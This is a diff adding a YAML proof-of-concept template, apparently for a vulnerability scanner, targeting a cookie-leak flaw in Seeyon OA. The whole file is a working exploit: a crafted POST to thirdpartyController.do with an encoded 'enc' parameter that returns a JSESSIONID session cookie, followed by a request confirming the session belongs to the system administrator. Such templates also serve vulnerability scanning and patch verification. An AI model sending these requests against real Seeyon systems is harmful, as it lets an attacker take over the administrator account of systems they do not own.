@@ -1,0 +1,32 @@
+id: poc-yaml-seeyon-oa-cookie-leak
+info:
+  name: Seeyon Oa Cookie Leak
+  severity: high
+  tags:
+  - 信息泄露
+  finger: Seeyon Oa
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: POST
+  path: /seeyon/thirdpartyController.do
+  headers: {}
+  data: method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "Set-Cookie") && contains(headers,
+    "JSESSIONID=") && contains(body, "/seeyon/common/")
+  output: []
+- method: GET
+  path: /seeyon/main.do?method=headerjs
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "\"name\":\"系统管理员\"") && contains(body,
+    "\"id\":\"-7273032013234748168\"")
+  output: []
